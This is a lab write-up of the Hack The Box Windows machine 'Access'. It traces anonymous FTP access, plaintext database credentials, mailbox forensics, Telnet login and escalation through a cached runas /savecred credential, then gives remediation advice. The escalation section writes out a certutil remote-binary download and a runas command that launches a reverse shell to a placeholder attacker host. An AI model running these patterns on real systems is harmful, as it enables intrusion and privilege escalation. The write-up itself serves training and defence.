---
title: "Access — Credential Sprawl Across Legacy Services"
description: "Anonymous FTP and archive recovery expose credentials that grant Telnet access, then escalate through cached credential abuse."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - credential-abuse
  - legacy-services
  - ftp
  - telnet
  - credential-manager
---

## Summary

Access is an Easy-rated Hack The Box Windows lab that demonstrates how sensitive data on misconfigured legacy services leads to full compromise without exploiting a single CVE. The recorded chain starts at anonymous FTP, recovers credentials from a database and an archived mailbox, gains user access over Telnet, then escalates via a cached `runas /savecred` credential. Every step abuses legitimate functionality that was misconfigured. Credential values, target addresses, and download locations are redacted below; command patterns are preserved.

## Context and Objective

- **Target:** Windows Server 2008 R2 (build 6.1.7600, end-of-life)
- **Services exposed:** FTP (port 21), Telnet (port 23), HTTP/IIS 7.5 (port 80)
- **Objective:** Achieve full compromise through the attack surface presented by the exposed services
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: three open TCP services with distinct attack surfaces. FTP allows anonymous login. Telnet leaks NTLM/machine details. HTTP serves an IIS page consistent with an older Windows build.

Action: full TCP scan, then targeted version/script scan of ports 21, 23, 80.

```bash
nmap -sT -p- --min-rate 5000 -oA <OUT_PREFIX> <TARGET_IP>
nmap -sC -sV -p 21,23,80 -oA <OUT_PREFIX> <TARGET_IP>
```

Representative excerpt (truncated):

```text
21/tcp open ftp    Microsoft ftpd — Anonymous FTP login allowed
23/tcp open telnet Microsoft Windows telnetd — NTLM info leaks machine identity, build 6.1.7600
80/tcp open http   Microsoft-IIS/7.5 — page title MegaCorp, potentially risky TRACE method
```

Technical significance: anonymous FTP is immediately actionable. Telnet is the only interactive shell service, so any recovered credential becomes directly useful. The leaked build (6.1.7600, Server 2008 R2 RTM) signals an end-of-life, likely unpatched host. HTTP is enumeration-only here; the notes do not use it for exploitation.

Result: the recorded output shows FTP, Telnet, and IIS exposed on an EOL Windows host.

### 2. Anonymous FTP — Data Exfiltration

Observation: two directories with one sensitive file each.

Action: anonymous login, list directories, transfer both files in binary mode. The source notes binary transfer mode before retrieving files; it does not evidence an actual passive/active failure or fix, so none is claimed.

```bash
ftp <TARGET_IP>
# user: anonymous
ftp> ls
# Backups/   Engineer/
ftp> cd Backups
ftp> get backup.mdb
ftp> cd ../Engineer
ftp> get "Access Control.zip"
```

Representative listing (structure only):

```text
Backups/  -> backup.mdb
Engineer/ -> Access Control.zip  (password-protected)
```

Result: the notes report both files retrieved for offline analysis.

### 3. Database Analysis — Credential Recovery

Observation: `backup.mdb` is a Microsoft Jet 4.0 database. Linux `mdbtools` reads it without Microsoft Office.

Action: list tables, count rows per table, dump the non-empty `auth_user` table.

```bash
mdb-tables <DB_FILE>
for t in $(mdb-tables <DB_FILE>); do mdb-count <DB_FILE> "$t"; done
mdb-export <DB_FILE> auth_user
```

Representative excerpt (schema only, values redacted):

```text
id,username,password,Status,last_login,RoleID,Remark
<3 rows returned — credential values redacted>
```

Technical significance: the table stores passwords in plaintext. One database-derived password unlocks the ZIP archive in the next stage (source-reported success).

Result: the notes report three stored credential pairs; one is reused against the encrypted archive.

### 4. Archive Extraction — Email Forensics

Observation: password-protected ZIP containing an Outlook Personal Storage Table (`.pst`).

Action: extract with an archive tool that handles the compression method, then convert the mailbox on Linux.

```bash
7z x "<ARCHIVE_FILE>"
# password prompt -> <ARCHIVE_PASSWORD> (redacted, database-derived)
sudo apt install pst-utils
readpst -D -r "<MAILBOX_FILE>"
cat "<MAILBOX_MBOX>"
```

Note: the source reports the standard `unzip` utility may fail on this archive's compression method while `7z` succeeds. No failure narrative beyond that is claimed.

Technical significance: PST files bundle mail, calendar, and contacts. Converting to mbox makes the message body searchable. The converted mail discloses valid Telnet credentials for a low-privileged service account (values redacted; source-reported).

Result: the notes report archive unlocked with the database-derived password and Telnet credentials recovered from mail.

### 5. Telnet — Initial Access

Observation: cleartext legacy shell service; recovered credentials fit it directly.

Action: authenticate over Telnet with the mailbox-derived credential.

```bash
telnet <TARGET_IP>
# login:    <LAB_USER>
# password: <LAB_USER_PASSWORD>
```

Representative excerpt:

```text
Welcome to Microsoft Telnet Server.
C:\Users\<LAB_USER>>
```

Technical significance: Telnet transmits everything in cleartext. The shell works but lacks control sequences and is unstable, so the source recommends upgrading to a PowerShell-based reverse shell served over HTTP. That upgrade is a recommendation only; the notes do not evidence it performed.

Result: the notes report a user-level shell and user flag on the user desktop (flag content omitted).

### 6. Post-Exploitation Enumeration — Cached Credential Discovery

Observation: security-application shortcut on the Public desktop.

Action: list the desktop, read the shortcut's target and arguments via the `WScript.Shell` COM object, then check the credential store.

```cmd
dir <PUBLIC_DESKTOP>
```

```powershell
$Wsh = New-Object -ComObject WScript.Shell
$sc = Get-Item "<PUBLIC_DESKTOP>\<APP_NAME>.lnk"
$Wsh.CreateShortcut($sc)
```

Representative excerpt (identifiers generalized):

```text
TargetPath : C:\Windows\System32\runas.exe
Arguments  : /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "<APP_PATH>"
```

```cmd
cmdkey /list
```

```text
Target: Domain:interactive=<DOMAIN>\<ADMIN_ACCOUNT>
Type:   Domain Password
```

Technical significance: `/savecred` caches the credential in Credential Manager after first successful use. Any process in the same user context can then invoke `runas /savecred` without a password prompt. The cache persists until explicitly removed.

Result: the recorded output shows the elevated account's domain password cached in the store.

### 7. Privilege Escalation — Credential Manager Abuse

Observation: cached elevated credential + arbitrary command execution as the low-privileged user equals escalation path.

Action (patterns only, locations redacted): stage a shell binary, listen on the attack host, execute it under the cached credential. A direct file-read alternative avoids the shell.

```cmd
certutil -urlcache -split -f <REMOTE_BINARY> <LOCAL_STAGING_PATH>
```

```bash
nc -lvnp <LISTEN_PORT>
```

```cmd
runas /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "<LOCAL_STAGING_PATH> -e cmd.exe <ATTACKER_HOST> <LISTEN_PORT>"
```

Direct-read alternative (pattern only):

```cmd
runas /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "cmd /c type <ADMIN_DESKTOP>\root.txt > <STAGING_OUT>"
type <STAGING_OUT>
```

Download details and encoded payloads are intentionally omitted as weaponized chains; the technique category and command roles are preserved.

Result: the notes report an elevated shell (`whoami` returns the administrator context) and root flag on the administrator desktop. Both are source-reported without independent output confirmation in the available evidence.

## Challenges and Decisions

| Challenge | Decision | Rationale |
|---|---|---|
| Encrypted ZIP archive | Used archive tool handling its compression method | Extracted mailbox file for analysis |
| Telnet shell instability | Notes recommend PowerShell-based reverse shell upgrade | Telnet lacks support for certain control sequences; recommendation only, not evidenced as performed |
| No exploitation of a single CVE | Followed data chain from FTP archives to Telnet credentials | Legitimate functionality abuse required no patch circumvention |

FTP transfer-mode note: binary mode used for retrieval. No passive/active failure or fix claimed.

## Outcome

The evidence establishes: user-level access via Telnet credential recovery from FTP-hosted database and mailbox material; elevated access via cached `runas /savecred` credential abuse. Reverse-shell establishment, mailbox conversion output, and flag acquisition are source-reported with the limitations noted above. HTTP played an enumeration-only role.

**Attack chain:**
Anonymous FTP → database mining → archive extraction → email forensics → Telnet login → cached credential abuse → elevated-privilege shell

## Lessons and Recommendations

Recommendations below follow the source remediation; none were re-tested during curation.

1. **Disable anonymous FTP access.** Require authentication. Never place credential-bearing exports or archived backups in FTP-reachable directories. Prefer SFTP. (Recommendation.)
2. **Replace Telnet with SSH.** Telnet exposes credentials and session data in cleartext to any network observer. OpenSSH provides equivalent access with encryption. (Recommendation.)
3. **Audit Credential Manager regularly.** `/savecred` entries persist until deleted. Disable storage via Group Policy (`Network access: Do not allow storage of passwords and credentials for network authentication`) where viable. Never cache privileged credentials in user-accessible stores. (Recommendation.)
4. **Protect sensitive data from anonymous-accessible services.** Plaintext database credentials unlocked an archive; archived mail yielded distinct shell credentials. Keep secrets out of anonymously reachable shares. (Lesson grounded in this chain.)
5. **Remove stale cached credentials.** Same-user processes reuse them without a prompt. Treat any `/savecred` use with privileged accounts as a finding. (Lesson grounded in this escalation.)

Editorial MITRE view (mapping only, not a source claim): valid-account logon over a cleartext remote service; credentials in files and mailbox stores; credential-manager cache abuse for privilege escalation.

## References

- Hack The Box machine **[Access](https://app.hackthebox.com/machines/Access)** (retired lab; no active-instance detail)
- Microsoft documentation: Windows Credential Manager and saved-credentials features
- `mdbtools` suite for Microsoft Access database inspection on Linux
- `pst-utils` package for Outlook PST file conversion
